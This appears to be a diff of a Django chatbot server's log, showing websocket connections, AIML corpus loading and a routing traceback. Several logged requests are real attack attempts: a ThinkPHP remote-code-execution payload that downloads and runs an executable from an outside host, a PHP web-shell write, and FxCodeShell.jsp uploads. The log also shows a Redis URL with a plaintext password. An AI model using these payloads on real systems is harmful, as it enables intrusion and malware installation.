@@ -1,8 +1,35 @@
 
-2019-03-21 00:03:25,595 WARNING  Not Found: /public/index.php
-2019-03-21 00:03:25,598 WARNING  Not Found: /public/index.php
-2019-03-21 00:03:25,601 WARNING  Not Found: /public/hydra.php
-done (0.00 seconds)
+2019-03-21 17:05:34,789 WARNING  Not Found: /public/index.php
+2019-03-21 17:05:34,824 WARNING  Not Found: /public/index.php
+2019-03-21 17:05:34,858 WARNING  Not Found: /public/hydra.php
+2019-03-21 18:29:04,913 WARNING  Not Found: www.google.com:443
+2019-03-21 18:29:05,028 WARNING  Not Found: http://www.google.com/
+2019-03-21 19:08:32,263 WARNING  Not Found: /FxCodeShell.jsp 
+2019-03-21 19:08:32,269 WARNING  Not Found: /FxCodeShell.jsp::$DATA
+2019-03-21 19:08:32,274 WARNING  Not Found: /FxCodeShell.jsp/
+2019-03-21 19:08:32,279 WARNING  Not Found: /FxCodeShell.jsp
+2019-03-21 23:08:20,404 WARNING  Not Found: /admin/assets/js/views/login.js
+120.199.34.100:61914 - - [21/Mar/2019:08:04:29] "WSDISCONNECT /ws/singleUser/wxy/" - -
+120.199.34.100:62144 - - [21/Mar/2019:08:07:42] "WSDISCONNECT /ws/singleUser/wxy/" - -
+120.199.34.100:62315 - - [21/Mar/2019:08:09:51] "WSDISCONNECT /ws/singleUser/wxy/" - -
+120.199.34.100:62360 - - [21/Mar/2019:08:10:25] "WSDISCONNECT /ws/singleUser/wxy/" - -
+120.199.34.100:62771 - - [21/Mar/2019:08:16:20] "WSDISCONNECT /ws/singleUser/wxy/" - -
+120.199.34.100:62911 - - [21/Mar/2019:08:18:21] "WSDISCONNECT /ws/singleUser/wxy/" - -
+112.10.182.179:1486 - - [21/Mar/2019:09:08:59] "WSDISCONNECT /ws/singleUser/wxy/" - -
+112.10.182.179:1519 - - [21/Mar/2019:09:09:35] "WSDISCONNECT /ws/singleUser/wxy/" - -
+112.10.182.179:1532 - - [21/Mar/2019:09:10:01] "WSDISCONNECT /ws/singleUser/wxy/" - -
+112.10.182.179:1588 - - [21/Mar/2019:09:12:41] "WSDISCONNECT /ws/singleUser/wxy/" - -
+112.10.182.179:1631 - - [21/Mar/2019:09:15:07] "WSDISCONNECT /ws/singleUser/wxy/" - -
+112.10.182.179:1657 - - [21/Mar/2019:09:16:31] "WSDISCONNECT /ws/singleUser/wxy/" - -
+112.10.182.179:1736 - - [21/Mar/2019:09:20:28] "WSDISCONNECT /ws/singleUser/1/" - -
+112.10.182.179:1858 - - [21/Mar/2019:09:24:55] "WSDISCONNECT /ws/singleUser/wxy/" - -
+112.10.182.179:1871 - - [21/Mar/2019:09:25:16] "WSCONNECTING /ws/chat/1/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
+112.10.182.179:1871 - - [21/Mar/2019:09:25:16] "WSCONNECT /ws/chat/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
@@ -11,62 +38,80 @@ Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-112.10.183.236:3320 - - [18/Mar/2019:02:51:06] "WSDISCONNECT /ws/chat/981260.6850815089907913/" - -
-112.10.183.236:3709 - - [18/Mar/2019:02:57:42] "WSCONNECTING /ws/chat/1/" - -
-RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
-112.10.183.236:3709 - - [18/Mar/2019:02:57:42] "WSCONNECT /ws/chat/1/" - -
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.179:1871 - - [21/Mar/2019:09:25:29] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.179:1075 - - [21/Mar/2019:09:36:04] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1093 - - [21/Mar/2019:09:36:25] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1122 - - [21/Mar/2019:09:37:33] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1153 - - [21/Mar/2019:09:39:10] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1313 - - [21/Mar/2019:09:45:13] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1049 - - [21/Mar/2019:09:59:33] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1152 - - [21/Mar/2019:10:01:53] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1216 - - [21/Mar/2019:10:03:34] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1267 - - [21/Mar/2019:10:04:26] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1280 - - [21/Mar/2019:10:04:54] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1473 - - [21/Mar/2019:10:07:12] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1692 - - [21/Mar/2019:14:55:45] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1088 - - [21/Mar/2019:15:02:30] "WSDISCONNECT /singleUser/wxy" - -
+112.10.182.179:1520 - - [21/Mar/2019:15:10:26] "WSDISCONNECT /singleUser/wxy/" - -
+112.10.182.179:1563 - - [21/Mar/2019:15:11:15] "WSDISCONNECT /singleUser/wxy/" - -
+180.153.63.186:61295 - - [21/Mar/2019:17:05:34] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ksepgdnxrpozkig29250.exe');start%20C:/Windows/temp/ksepgdnxrpozkig29250.exe" 404 1121
+180.153.63.186:61295 - - [21/Mar/2019:17:05:34] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
+180.153.63.186:61295 - - [21/Mar/2019:17:05:34] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ksepgdnxrpozkig29250.exe');start%20C:/Windows/temp/ksepgdnxrpozkig29250.exe" 404 1121
+193.112.96.94:54536 - - [21/Mar/2019:18:29:04] "CONNECT www.google.com:443" 404 1121
+193.112.96.94:54550 - - [21/Mar/2019:18:29:05] "GET http://www.google.com/" 404 1121
+119.29.203.241:64609 - - [21/Mar/2019:19:08:32] "PUT /FxCodeShell.jsp%20" 404 1121
+119.29.203.241:64609 - - [21/Mar/2019:19:08:32] "PUT /FxCodeShell.jsp::$DATA" 404 1121
+119.29.203.241:64609 - - [21/Mar/2019:19:08:32] "PUT /FxCodeShell.jsp/" 404 1121
+119.29.203.241:64609 - - [21/Mar/2019:19:08:32] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
+185.53.91.50:37360 - - [21/Mar/2019:23:08:20] "GET /admin/assets/js/views/login.js" 404 1121
+125.64.94.197:36635 - - [22/Mar/2019:00:55:41] "GET /" 200 11772
+120.199.34.100:61474 - - [22/Mar/2019:01:41:08] "WSCONNECTING /ws/chat/757330.046048170156440804/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
+120.199.34.100:61474 - - [22/Mar/2019:01:41:08] "WSCONNECT /ws/chat/757330.046048170156440804/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.06 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-112.10.183.236:3709 - - [18/Mar/2019:04:41:01] "WSDISCONNECT /ws/chat/1/" - -
-119.29.102.136:51298 - - [18/Mar/2019:14:00:52] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ngdenxtstbceouc8552.exe');start%20C:/Windows/temp/ngdenxtstbceouc8552.exe" 404 1121
-119.29.102.136:51298 - - [18/Mar/2019:14:00:53] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
-119.29.102.136:51298 - - [18/Mar/2019:14:00:53] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ngdenxtstbceouc8552.exe');start%20C:/Windows/temp/ngdenxtstbceouc8552.exe" 404 1121
-139.162.79.87:41822 - - [18/Mar/2019:15:46:17] "GET /" 200 11772
-119.29.57.86:30979 - - [18/Mar/2019:17:09:17] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
-119.29.57.86:30979 - - [18/Mar/2019:17:09:17] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
-119.29.57.86:30979 - - [18/Mar/2019:17:09:17] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
-119.29.57.86:29027 - - [19/Mar/2019:00:43:21] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
-119.29.57.86:29027 - - [19/Mar/2019:00:43:21] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
-119.29.57.86:29027 - - [19/Mar/2019:00:43:21] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
-119.29.57.86:50042 - - [19/Mar/2019:01:51:43] "GET /struts2-rest-showcase/orders.xhtml" 404 1121
-119.29.57.86:50042 - - [19/Mar/2019:01:51:43] "GET /index.action" 404 1121
-119.29.57.86:50042 - - [19/Mar/2019:01:51:43] "GET /index.do" 404 1121
-119.29.57.86:6916 - - [19/Mar/2019:03:13:55] "GET /struts2-rest-showcase/orders.xhtml" 404 1121
-119.29.57.86:6916 - - [19/Mar/2019:03:13:55] "GET /index.action" 404 1121
-119.29.57.86:6916 - - [19/Mar/2019:03:13:55] "GET /index.do" 404 1121
-119.29.57.86:64618 - - [19/Mar/2019:16:28:56] "GET /struts2-rest-showcase/orders.xhtml" 404 1121
-119.29.57.86:64618 - - [19/Mar/2019:16:28:56] "GET /index.action" 404 1121
-119.29.57.86:64618 - - [19/Mar/2019:16:28:56] "GET /index.do" 404 1121
-119.29.203.241:54148 - - [19/Mar/2019:19:38:56] "PUT /FxCodeShell.jsp%20" 404 1121
-119.29.203.241:54148 - - [19/Mar/2019:19:38:56] "PUT /FxCodeShell.jsp::$DATA" 404 1121
-119.29.203.241:54148 - - [19/Mar/2019:19:38:56] "PUT /FxCodeShell.jsp/" 404 1121
-119.29.203.241:54148 - - [19/Mar/2019:19:38:56] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
-117.132.155.4:55776 - - [20/Mar/2019:11:12:17] "PUT /FxCodeShell.jsp%20" 404 1121
-117.132.155.4:55776 - - [20/Mar/2019:11:12:17] "PUT /FxCodeShell.jsp::$DATA" 404 1121
-117.132.155.4:55776 - - [20/Mar/2019:11:12:17] "PUT /FxCodeShell.jsp/" 404 1121
-117.132.155.4:55776 - - [20/Mar/2019:11:12:17] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
-119.29.57.86:26853 - - [21/Mar/2019:00:03:25] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
-119.29.57.86:26853 - - [21/Mar/2019:00:03:25] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
-119.29.57.86:26853 - - [21/Mar/2019:00:03:25] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/oehbbgpcrceruju28167.exe');start%20C:/Windows/temp/oehbbgpcrceruju28167.exe" 404 1121
+2019-03-22 04:20:34,755 ERROR    [Failure instance: Traceback: <class 'ValueError'>: No route found for path 'singleUser/wxy/'.
+/usr/local/lib/python3.7/site-packages/autobahn/websocket/protocol.py:2801:processHandshake
+/usr/local/lib/python3.7/site-packages/txaio/tx.py:429:as_future
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/ws_protocol.py:82:onConnect
+--- <exception caught here> ---
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/server.py:200:create_application
+/usr/local/lib/python3.7/site-packages/channels/routing.py:58:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:43:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:141:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:165:__init__
+/usr/local/lib/python3.7/site-packages/channels/middleware.py:31:__call__
+/usr/local/lib/python3.7/site-packages/channels/routing.py:154:__call__
+]
